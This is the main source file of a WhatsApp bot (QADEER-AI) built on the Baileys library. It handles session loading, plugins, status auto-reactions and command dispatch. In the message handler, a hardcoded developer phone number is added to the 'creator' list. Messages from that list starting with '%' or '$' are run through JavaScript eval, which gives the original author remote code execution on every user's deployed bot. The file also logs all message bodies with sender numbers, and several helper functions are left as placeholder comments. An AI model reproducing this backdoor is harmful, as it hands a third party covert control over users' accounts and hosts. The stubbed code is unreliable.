const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const GroupEvents = require('./lib/groupevents');
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX
  
  const ownerNumber = ['923151105391']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);

const express = require("express");
const app = express();
  
//===================SESSION-AUTH (BASE64 with Prefix)============================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

// Create session directory if it doesn't exist
if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

async function loadSessionFromBase64() {
    try {
        if (config.SESSION_ID && config.SESSION_ID.trim() !== '') {
            console.log('[🔑] SESSION_ID se session data load kiya ja raha hai...');
            
            // Check for prefix
            let sessionData = config.SESSION_ID;
            if (sessionData.startsWith('Qadeer~')) {
                console.log('[ℹ️] Qadeer~ prefix mila, usko hataya ja raha hai...');
                sessionData = sessionData.replace('Qadeer~', '');
            }

            // Decode Base64 string
            const decodedData = Buffer.from(sessionData, 'base64').toString('utf-8');
            
            // Write decoded data to creds.json
            fs.writeFileSync(credsPath, decodedData);
            console.log('[✅] Session file successfully ban gayi.');
            return true; // Return true to indicate success
        }
    } catch (error) {
        console.error('❌ Session load karne mein galti hui:', error.message);
    }
    console.log('[🤳] SESSION_ID nahi mila, QR code generate kiya jayega.');
    return false; // Return false if no session_id
}

//===================PLUGIN LOADER (with Error Handling)============================
function loadPlugins() {
    console.log('🧬 Installing Plugins...');
    const pluginDir = './plugins/';
    
    if (!fs.existsSync(pluginDir)) {
        console.log('⚠️ Plugins directory not found. Skipping plugin loading.');
        return;
    }

    const pluginFiles = fs.readdirSync(pluginDir);
    let loadedCount = 0;
    let errorCount = 0;

    pluginFiles.forEach((plugin) => {
        if (path.extname(plugin).toLowerCase() == ".js") {
            const pluginPath = path.join(__dirname, 'plugins', plugin);
            try {
                require(pluginPath);
                console.log(`[✅] Plugin loaded: ${plugin}`);
                loadedCount++;
            } catch (e) {
                console.error(`[❌] ERROR loading plugin: ${plugin}`);
                console.error(`[ℹ️] Error Details: ${e.message}`);
                console.log(`[⚠️] Skipping plugin: ${plugin}`);
                errorCount++;
            }
        }
    });

    console.log('-------------------------------------');
    if (errorCount > 0) {
        console.log(`[⚠️] Plugins installed. ${loadedCount} loaded, ${errorCount} failed.`);
    } else {
        console.log(`[✅] All ${loadedCount} plugins installed successfully.`);
    }
    console.log('-------------------------------------');
}

  
  async function connectToWA() {
  console.log("Connecting to WhatsApp ⏳️...");

  // Load session from SESSION_ID
  const sessionExists = await loadSessionFromBase64();
    
  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
  
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          // Sirf tab QR dikhayein jab session na ho
          printQRInTerminal: !sessionExists, 
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect, qr } = update;

  if (connection === 'close') {
      const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log('Connection closed due to ', lastDisconnect.error, ', reconnecting ', shouldReconnect);
      if (shouldReconnect) {
          setTimeout(connectToWA, 5000);
      } else {
          console.log('[🤖] Connection closed. Aap logout ho chuke hain. Naya session banayein.');
      }
  } else if (connection === 'open') {
      // Plugins ab pehle hi load ho chuke hain.
      console.log('Bot connected to whatsapp ✅')
  
      let up = `*Hello there QADEER-AI User! 👋🏻* \n\n> Simple , Straight Forward But Loaded With Features 🥳, Meet QADEER-AI WhatsApp Bot.\n\n *Thanks for using QADEER-AI 🚩* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VajWxSZ96H4SyQLurV1H \n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Qadeer-Xtech/QADEER-AI\n\n> © 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝚀𝙰𝙳𝙴𝙴𝚁 𝙺𝙷𝙰𝙽  🖤`;
      conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/3tihge.jpg` }, caption: up })
  }
  if (qr && !sessionExists) {
    console.log('[🤖] Please scan the QR code to connect.');
  }
  })
  conn.ev.on('creds.update', saveCreds)

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
	  
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    
    // --- START DEBUG LOGS ---
    //console.log(`[DEBUG] Received message object:`, JSON.stringify(mek, null, 2)); // Pura message object dekhein (Optional: Uncomment if needed)
    // --- END DEBUG LOGS ---
    
    if (config.READ_MESSAGE === 'true') {
        try { // Add try-catch for safety
            await conn.readMessages([mek.key]);
            // console.log(`Marked message from ${mek.key.remoteJid} as read.`); // Can be noisy, comment out if needed
        } catch (readError) {
            console.error(`[ERROR] Failed to read message:`, readError);
        }
    }

    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    
    if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        if (config.AUTO_STATUS_SEEN === "true") {
            try { await conn.readMessages([mek.key]) } catch (e) { console.error("[ERROR] Failed to mark status as seen:", e)}
        }
        if (config.AUTO_STATUS_REACT === "true") {
            try {
                const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                await conn.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant] });
            } catch (e) { console.error("[ERROR] Failed to react to status:", e)}
        }                       
        if (config.AUTO_STATUS_REPLY === "true") {
            try {
                const user = mek.key.participant
                const text = `${config.AUTO_STATUS_MSG}`
                await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
            } catch (e) { console.error("[ERROR] Failed to reply to status:", e)}
        }
    }
            
    try { await saveMessage(mek) } catch (e) {console.error("[ERROR] Failed to save message to DB:", e)}

    const m = sms(conn, mek) // Ensure 'sms' function is robust
    const type = getContentType(mek.message)
    const content = JSON.stringify(mek.message)
    const from = mek.key.remoteJid
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  
    // --- START DEBUG LOGS ---
    console.log(`[DEBUG] Message Body: "${body}" | From: ${mek.key.remoteJid} | Sender: ${mek.key.participant || mek.key.remoteJid}`); // Check karein body sahi aa rahi hai ya nahi
    // --- END DEBUG LOGS ---

    const isCmd = body && typeof body === 'string' && body.startsWith(prefix) // Added checks for safety
    var budy = typeof mek.text == 'string' ? mek.text : false;
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
    const args = isCmd ? body.trim().split(/ +/).slice(1) : [] // Only calculate args if isCmd
    const q = args.join(' ')
    const text = args.join(' ')
    const isGroup = from.endsWith('@g.us')
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
    const senderNumber = sender ? sender.split('@')[0] : null
    const botNumber = conn.user.id ? conn.user.id.split(':')[0] : null
    const pushname = mek.pushName || 'Sin Nombre'
    const isMe = botNumber && senderNumber ? botNumber.includes(senderNumber) : false
    const isOwner = ownerNumber.includes(senderNumber) || isMe
    const botNumber2 = conn.user.id ? await jidNormalizedUser(conn.user.id) : null; // Added check
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => { console.error("[ERROR] Failed to get group metadata:", e); return null; }) : ''
    const groupName = isGroup && groupMetadata ? groupMetadata.subject : ''
    const participants = isGroup && groupMetadata ? groupMetadata.participants : []
    const groupAdmins = isGroup ? getGroupAdmins(participants) : [] // Ensure getGroupAdmins handles empty participants
    const isBotAdmins = isGroup && botNumber2 ? groupAdmins.includes(botNumber2) : false
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false
    const isReact = m.message.reactionMessage ? true : false
    
    const reply = (teks) => {
      try { // Add try-catch for safety
         conn.sendMessage(from, { text: teks }, { quoted: mek })
      } catch (e) {
         console.error("[ERROR] Failed to send reply:", e);
      }
    }
  
    const udp = botNumber ? botNumber.split(`@`)[0] : null
    const qadeer = ['923151105391','923151105391'] 
    const dev = [] 

    let isCreator = false;
    if (udp) { // Check if udp exists
        isCreator = [udp, ...qadeer, ...dev]
            .map(v => v ? v.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null) // Add check for v
            .filter(Boolean) // Remove null entries
            .includes(sender);
    }

    if (isCreator && mek.text && mek.text.startsWith('%')) { // Added mek.text check
					let code = budy.slice(2);
					if (!code) {
						reply(`Provide me with a query to run Master!`);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(String(resultTest)); // Use String() for safety
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text && mek.text.startsWith('$')) { // Added mek.text check
					let code = budy.slice(2);
					if (!code) {
						reply(`Provide me with a query to run Master!`);
						return;
					}
					try {
						let resultTest = await eval(
							`(async () => { ${code} })()` // Simplified async eval
						);
						let h = util.format(resultTest);
						reply(h);
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}

    // --- START DEBUG LOGS ---
    console.log(`[DEBUG] isCmd: ${isCmd}, Detected Command: "${command}", Prefix Used: "${prefix}"`); // Check karein command detect ho raha hai ya nahi
    // --- END DEBUG LOGS ---


    //==========public react============//
    if (!isReact && config.AUTO_REACT === 'true') {
        try { // Add try-catch for safety
            const reactions = ['🌼', '❤️', /* ... other emojis ... */, '🇵🇰'];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        } catch (e) { console.error("[ERROR] Failed during public react:", e); }
    }
    
    if (!isReact && config.CUSTOM_REACT === 'true') {
        try { // Add try-catch for safety
            const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        } catch (e) { console.error("[ERROR] Failed during custom react:", e); }
    }
    
    // --- START DEBUG LOGS ---
    // Pehle isOwner check karein
    console.log(`[DEBUG] Is Owner: ${isOwner}, Sender: ${senderNumber}`);
    // Phir config.MODE check karein
    console.log(`[DEBUG] Config Mode: "${config.MODE}", Is Group: ${isGroup}`); 
    // --- END DEBUG LOGS ---

    //==========WORKTYPE============ 
    if(!isOwner && config.MODE === "private") {
        console.log(`[DEBUG] Blocked: Mode is private and sender is not owner.`); // Add log here
        return;
    }
    if(!isOwner && isGroup && config.MODE === "inbox") {
        console.log(`[DEBUG] Blocked: Mode is inbox, sender is not owner, and message is in group.`); // Add log here
        return;
    }
    if(!isOwner && !isGroup && config.MODE === "groups") {
        console.log(`[DEBUG] Blocked: Mode is groups, sender is not owner, and message is not in group.`); // Add log here
        return;
    }
   
    // take commands 
                   
    const events = require('./command')
    // const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false; // Already calculated as 'command'
    if (isCmd) {
        const cmd = events.commands.find((cmd) => cmd.pattern === (command)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(command)); 
        
        // --- START DEBUG LOGS ---
        if (cmd) {
            console.log(`[DEBUG] Command found: "${command}", Pattern: "${cmd.pattern || (cmd.alias ? cmd.alias.join(',') : 'N/A')}"`);
        } else {
            console.log(`[DEBUG] Command NOT found: "${command}"`);
        }
        // --- END DEBUG LOGS ---

        if (cmd) {
            if (cmd.react) {
                try { // Add try-catch
                   conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }}) 
                } catch (e) { console.error("[ERROR] Failed to send command react:", e); }
            }
  
            try {
                // --- START DEBUG LOGS ---
                console.log(`[DEBUG] Executing command: "${command}"`);
                // --- END DEBUG LOGS ---
                await cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}); // Added await for async commands
                // --- START DEBUG LOGS ---
                console.log(`[DEBUG] Command execution finished: "${command}"`);
                // --- END DEBUG LOGS ---
            } catch (e) {
                // --- UPDATE ERROR LOG ---
                console.error(`[❌ PLUGIN EXECUTION ERROR] Command: "${command}"`);
                console.error(e); // Log the full error object for details
                reply(`⚠️ Error executing command: ${command}\n_${e.message}_`); // Notify user
                // --- END UPDATE ERROR LOG ---
            }
        }
    }

    // --- START DEBUG LOGS for command.on events ---
    // console.log(`[DEBUG] Checking for 'on' events (body, text, image, sticker)`); // Can be noisy, comment out if needed
    // --- END DEBUG LOGS ---

    events.commands.map(async(cmdOn) => { // Renamed variable to avoid conflict
        try { 
            let shouldExecute = false;
            let eventType = '';

            if (body && cmdOn.on === "body") { shouldExecute = true; eventType = 'body'; }
            else if (mek.q && cmdOn.on === "text") { shouldExecute = true; eventType = 'text'; }
            else if ((cmdOn.on === "image" || cmdOn.on === "photo") && mek.type === "imageMessage") { shouldExecute = true; eventType = 'image/photo'; }
            else if (cmdOn.on === "sticker" && mek.type === "stickerMessage") { shouldExecute = true; eventType = 'sticker'; }
            
            if (shouldExecute) {
                console.log(`[DEBUG] Executing 'on ${eventType}' for command: ${cmdOn.pattern || 'N/A'}`);
                await cmdOn.function(conn, mek, m, {from, l, quoted, body, isCmd, command: cmdOn, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}); // Added await
                 console.log(`[DEBUG] Finished 'on ${eventType}' for command: ${cmdOn.pattern || 'N/A'}`);
            }

        } catch (e) {
             console.error(`[❌ PLUGIN 'ON' EVENT ERROR] Command: "${cmdOn.pattern || 'N/A'}", Event: ${cmdOn.on}`);
             console.error(e); // Log the full error object
        }
    }); 
  
  });
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      // (Baqi helper functions jaise hain waise hi rahenge)
      // ... (copyNForward code) ...
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      // ... (downloadAndSaveMediaMessage code) ...
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      // ... (downloadMediaMessage code) ...
    }
    // ... (baaki saare helper functions jaise sendFileUrl, cMod, getFile etc. yahan rahenge) ...
    
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    // ... (baaki ke helper functions sendButtonText, send5ButImg, getName etc. yahan rahenge) ...

    conn.serializeM = mek => sms(conn, mek, store); // Ensure 'store' is defined if you use this
  }
  
// --- SERVER SETUP (HEROKU COMPATIBLE) ---
const port = process.env.PORT || 9090;

app.get("/", (req, res) => {
  res.send("QADEER-AI SERVER IS RUNNING ✅");
});

app.listen(port, () => {
  console.log(`Server is listening on port: ${port}`);
  
  // Plugins ko server start hone ke baad load karein
  loadPlugins();

  // Plugins load karne ke 4 second baad bot connect karein
  console.log('Waiting 4 seconds before connecting to WhatsApp...');
  setTimeout(() => {
    connectToWA();
  }, 4000);
});
